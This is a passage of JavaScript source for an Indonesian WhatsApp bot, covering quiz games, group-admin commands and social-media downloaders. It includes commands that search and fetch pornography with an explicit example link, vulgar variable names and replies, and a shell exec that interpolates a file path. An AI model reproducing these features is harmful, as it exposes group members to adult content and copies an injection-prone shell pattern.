              itsmevall.sendMessage(from, ini_buffer, image, { quoted: freply, caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s' }).then(() => {
              tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
})
              await sleep(30000)
              if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              titid = "*Jawaban*: " + jawaban
                   sendButMessage(from, titid, `Klik Untuk Ke Game`, [
          {
            buttonId: `${prefix}tebakanime`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
              
              delete tebakanime[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
}
              gameAdd(sender, glimit)
              break
       case "tebakgambar":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (isBanned) return reply(mess.ban)
					  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/tebakgambar?apikey=beta`)
   gambar = await getBuffer(anu.result.images)
   setTimeout( () => {
   reply('*➸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 60000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagi…_', text) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_…', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_60 Detik lagi_…', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   itsmevall.sendMessage(from, gambar, image, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   limitAdd(sender, limit)
   break
       case 'siapakahaku':
              if (isGame(sender, isPremium)) return reply(`Limit game kamu sudah habis`)
              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=${lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              itsmevall.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebaksiapaaku[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
})
              await sleep(30000)
              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebaksiapaaku[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
}
              gameAdd(sender, glimit)
              break
       case 'tebakkata':
              if (isGame(sender, isPremium)) return reply(`Limit game kamu sudah habis`)
              if (tebakata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/kata?apikey=${lolkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              pertanyaan = get_result.pertanyaan
              itsmevall.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {
              tebakata[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
})
              await sleep(30000)
              if (tebakata.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakata[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
}
              gameAdd(sender, glimit)
              break
       case 'tebaklirik':
              if (isGame(sender, isPremium)) return reply(`Limit game kamu sudah habis`)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/lirik?apikey=${lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              itsmevall.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
})
              await sleep(30000)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebaklirik[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
}
              gameAdd(sender, glimit)
              break
      case 'tebakjenaka':
              if (isGame(sender, isPremium)) return reply(`Limit game kamu sudah habis`)
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/jenaka?apikey=${lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              itsmevall.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebakjenaka[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
})
              await sleep(30000)
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakjenaka[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
}
              gameAdd(sender, glimit)
              break
       case 'kimiakuis':
              if (isGame(sender, isPremium)) return reply(`Limit game kamu sudah habis`)
              if (tebakimia.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=${lolkey}`)
              get_result = get_result.result
              jawaban = get_result.lambang
              pertanyaan = get_result.nama
              itsmevall.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {
              tebakimia[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
})
              await sleep(30000)
              if (tebakimia.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakimia[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
}
              gameAdd(sender, glimit)
              break
       case 'tebakbendera':
              if (isGame(sender, isPremium)) return reply(`Limit game kamu sudah habis`)
              if (tebakbendera.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/bendera?apikey=${lolkey}`)
              get_result = get_result.result
              jawaban = get_result.name
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.flag
              itsmevall.sendMessage(from, '*+* ```Tebak Bendera```\n\n• *Bendera* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebakbendera[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
})
              await sleep(30000)
              if (tebakbendera.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete tebakbendera[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
}
              gameAdd(sender, glimit)
              break
       case 'susunkata':
              if (isGame(sender, isPremium)) return reply(`Limit game kamu sudah habis`)
              if (susunkata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/susunkata?apikey=${lolkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              pertanyaan = get_result.pertanyaan
              itsmevall.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: freply}).then(() => {
              susunkata[sender.split('@')[0]] = jawaban.toLowerCase('reading toLowerCase')
              fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
})
              await sleep(30000)
              if (susunkata.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete susunkata[sender.split('@')[0]]
              fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
}
              gameAdd(sender, glimit)
              break
       case 'asahotak':
              if (isGame(sender, isPremium)) return reply(`Limit game kamu sudah habis`)
              if (asahotak.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/asahotak?apikey=${lolkey}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.pertanyaan
              itsmevall.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              asahotak[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
})
              await sleep(30000)
              if (asahotak.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete asahotak[sender.split('@')[0]]
              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
}
              gameAdd(sender, glimit)
              break
       case 'caklontong':
              if (isGame(sender, isPremium)) return reply(`Limit game kamu sudah habis`)
              if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/caklontong2?apikey=${lolkey}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              itsmevall.sendMessage(from, '*+* ```Caklontong```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
})
              await sleep(30000)
              if (caklontong.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              reply("Jawaban: " + jawaban)
              delete caklontong[sender.split('@')[0]]
              fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
}
              gameAdd(sender, glimit)
              break
              case 'listadmin':
					if (!isGroup) return reply(mess.only.group)
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break					
					case 'setppgc':
					case 'setppgrup':          
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (isQuotedImage) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
   let media = await itsmevall.downloadMediaMessage(encmedia)
   itsmevall.updateProfilePicture(from, media)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
   } else if (isQuotedSticker){
   if (mek.message.videoMessage) return reply('Error Bro Wkwkwk')
   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   media = await itsmevall.downloadAndSaveMediaMessage(encmedia)
   ran = getRandom('.png')
   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
   fs.unlinkSync(media)
   if (err) return reply('Gagal, hehehe')
   buffer = fs.readFileSync(ran)
   itsmevall.updateProfilePicture(from, buffer)
   fs.unlinkSync(ran)
   })
   } else {
   reply(`Kirim atau tag gambar/sticker dengan caption ${prefix}setppgrup ya sayang 💕`)
   }
   break                   
                    case 'getpict':
				case 'getpic':
					case 'getpp':
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await itsmevall.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            itsmevall.sendMessage(from, pict, image, {quoted: mek})
            limitAdd(sender, limit)
            break
            case 'link':
            case 'linkgrup':
				case 'linkgroup':
				case 'linkgc':
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply('Bot harus jadi admin tot')
					linkgc = await itsmevall.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					itsmevall.sendMessage(from, yeh, text, { quoted: mek })
					break
				case 'chat':
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            itsmevall.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
      case "sider":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        if (!m.quoted) throw `Balas pesan bot!`;
        let members = m.quoted.chat.endsWith("g.us")
          ? (await itsmevall.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await itsmevall.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Dibaca oleh:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length} tersisa` : ""}

*Terkirim ke:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
`.trim();
        m.reply(txt, null, {
          contextInfo: {
            mentionedJid: itsmevall.parseMention(txt),
          },
        });
        limitAdd(sender, limit)
        break;                            
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isBanned) return reply(mess.ban)
                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                 buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${setting.lolkey}&text1=${txt1}&text2=${txt2}`)
                          buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'ℎ𝑒𝑟𝑚𝑎𝑛 𝐵𝑜𝑡𝑧☕', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @cal_me alya`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
                    break                         
      case "q":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        if (!m.quoted) return reply("reply message!");
        let qse = itsmevall.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        limitAdd(sender, limit)
        break;
      case "kick":
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return reply('Only Admin');
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Tag target yang ingin di kick!");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          itsmevall.groupRemove(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          itsmevall.groupRemove(from, [anu]);
          reply(mess.success);
        } else {
          itsmevall.groupRemove(from, mentioned);
          reply(mess.success);
        }
        break;
        case 'image':
       case 'gimage':
       case 'googleimage':
              if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
              if (args.length < 1) return reply('Apa Yang Mau Dicari?')
             reply(`PEROSES`)
              teks = args.join(' ')
              res = await googleImage(teks, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
              else {
              gugIm = result
              random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
limitAdd(sender, limit)
             break       
       case 'telesticker': 
       case 'telestiker':
              if (!q) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
               reply(`PEROSES`)
              ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${setting.lolkey}&url=${args[0]}`)
              ini_sticker = ini_url.result.sticker
              reply('Sending '+ ini_sticker.length +' stickers...')
              for (sticker_ in ini_sticker) {
              ini_buffer = await getBuffer(ini_sticker[sticker_])
              itsmevall.sendMessage(from, ini_buffer, sticker, {})
}
              break
        case 'tagall':
        case 'otagall':
        case 'tgall':
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (isBanned) return reply(mess.ban)
           if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");           
              if (!isGroup) return reply(mess.only.group)
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              limitAdd(sender, limit)
              break
              case 'infoall':                   
              	if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
					if (!isGroup) return reply('this feature is only for groups')					
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `_/\_ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break 
case 'tagme':
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					itsmevall.sendMessage(from, tagu, text, { quoted: foncevid, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
      case "add":
        return reply('*Disable By Owner*')
        break;
case 'igtv': case 'tvig': case 'instagramtv':  
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
                if(!q)return reply(`Example : ${prefix + command} link Instagram`)
                if (!q.includes('instagram.com')) return reply('Itu bukan link instagram/')
                await reply(mess.wait)
				xa.Instagram(`${q}`).then(async (data) => {
                    let txt = `*----「 INSTAGRAM DOWNLOAD 」----*\n\n`
                    txt += `*• Title :* ${data.title}\n`
                    txt += `*• Duration :* ${data.duration}\n`
					txt += `*• Quality :* ${data.medias[1].quality}\n`
					txt += `*• Ext :* ${data.medias[0].extension}\n`
                    txt += `*• Size :* ${data.medias[0].formattedSize}\n`
                    txt += `*• Url  :* ${data.url}\n\n`
                    txt += `*Mohon tunggu sebentar, sedang proses pengiriman...*`
                    kontol = await getBuffer(data.thumbnail);
                    sendFileFromUrl(from, data.medias[1].url, '', mek)
                    sendButLocation(from, `${txt}`,`© REALZIBOT`, {jpegThumbnail:kontol}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
                    })
                .catch((err) => {
                    reply(`Server Erorr`)
                })
                limitAdd(sender, limit)
                break        
case 'ig':
case 'igdl':
case 'instagram':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
    if (!q) return reply('Linknya?')
    reply(mess.wait)
	if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply('Lu Masukin link apan tot')
	let urlnya = q
	hx.igdl(urlnya)
	.then(async(result) => {
		for(let i of result.medias){
			if(i.url.includes('mp4')){
				let link = await getBuffer(i.url)
                    itsmevall.sendMessage(from,link,video,{thumbnail: Buffer.alloc(0), quoted: mek,caption: `Instagram •  ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    itsmevall.sendMessage(from,link,image,{thumbnail: Buffer.alloc(0), quoted: mek,caption: `Instagram • ${i.type}`})                  
                }
            }
            }).catch((err) => reply(`🤲 Server eror`))
            limitAdd(sender, limit)
             break
case 'igstory':
if (isBanned) return reply(mess.ban)
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    itsmevall.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    itsmevall.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break            
            case 'xnxxsearch':
                    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                    if (isBanned) return reply(mess.ban)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break
                    case 'xnxx':
                    if (isBanned) return reply(mess.ban)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=${lolkey}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await itsmevall.sendMessage(from, thumbnail, image, { quoted: mek , caption: ini_txt })
                    break
case 'joox':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
try{
if(!q)return reply(`Judul lagu nya mana?`)
reply((mess.wait))
jx = await fetchJson(`https://api.zeks.me/api/joox?apikey=${zekskey}&q=${q}`)
jxx = `*----「 JOOX DOWNLOADER 」----*

🔖 *Size* : ${jx.data[0].size}
🔖 *Judul* : ${jx.data[0].judul}
🔖 *Url* : ${jx.data[0].audio}
🔖 *Album* : ${jx.data[0].album}
`
ngtes = await getBuffer(jx.data[0].thumb);
sendMediaURL(from,jx.data[0].audio)
sendButLocation(from, `${jxx}`,`© REALZIBOT`, {jpegThumbnail:ngtes}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
} catch (e) {
reply(e)
console.log(e)
}
limitAdd(sender, limit)
break                    
            case 'fbdl':
      case 'fb':
      case "facebook":
      case 'facebok': case 'fb': case 'fbdl': case 'facebookdl':{
	if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
                if(!q)return reply(`Example : ${prefix + command} link Facebook`)
                if (!q.includes('facebook.com') && !q.includes('fb.watch')) return reply('Itu bukan link Facebook')
                reply(mess.wait)
try{
                xa.Facebook(`${q}`).then(async (data) => {
                    let txt = `*----「 FACEBOOK DOWNLOADER 」----*\n\n`
                    txt += `*• Title :* ${data.title}\n`
                    txt += `*• Type :* ${data.medias[0].extension}\n`
                    txt += `*• Quality :* ${data.medias[0].quality}\n`
                    txt += `*• Size HD:* ${data.medias[1].formattedSize}\n`
					txt += `*• Url :* ${data.url}`
					txt += `*Mohon tunggu sebentar kak, sedang proses pengiriman...*`
                    wwok = await getBuffer(data.thumbnail);
                    sendFileFromUrl(from, data.medias[0].url, '', mek)
                    sendButLocation(from, `${txt}`,`© REALZIBOT`, {jpegThumbnail:wwok}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
             })} catch {
             	reply('Fitur sedang error')
} 
   }          
   limitAdd(sender, limit)
             break               
            case 'apikey':
            return reply('https://api-alya.herokuapp.com')
case 'linkwa':
case 'carigc':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            limitAdd(sender, limit)
            break
            case 'mediafire':
            case 'mediafire2':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)            
if (!isPremium && !isOwner && !mek.key.fromMe) return reply(mess.prem)            
if (isBanned) return reply(mess.ban)
if (!q) return reply(`Example : ${prefix + command} http://www.mediafire.com/file/js0gr2nozcmk9yg/example.txt/file`)
reply(mess.wait)
lah = await fetchJson(`https://api.lolhuman.xyz/api/mediafire?apikey=${lolkey}&url=${q}`)
reply(`*----「 MEDIAFIRE DOWNLOADER 」----*\n\n*NAME* : ${lah.result.filename}\n*FILETYPE* : ${lah.result.filetype}\n*FILESIZE* : ${lah.result.filesize}\n*UPLOADED* : ${lah.result.uploaded}`)
down = await getBuffer(lah.result.link)
itsmevall.sendMessage(from, down, document, { mimetype: 'application/zip', filename: lah.result.filename, quoted: mek, contextInfo: {mentionedJid: [sender]}})
limitAdd(sender, limit)
break
case 'googledrive':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (!q) return reply(`Example : ${prefix + command} https://www.google.com/intl/en_sg/drive/`)
                fetchJson(`https://api.zeks.me/api/gdbypass?apikey=${zekskey}&url=${q}`)
                    .then((res) =>{                    
                    textImg(`GOOGLE DRIVE BYPASS\n\nNama: ${res.data.file_name}\nLink Download: ${res.data.download_link}\nDirect Link: ${res.data.direct_download}`)                              
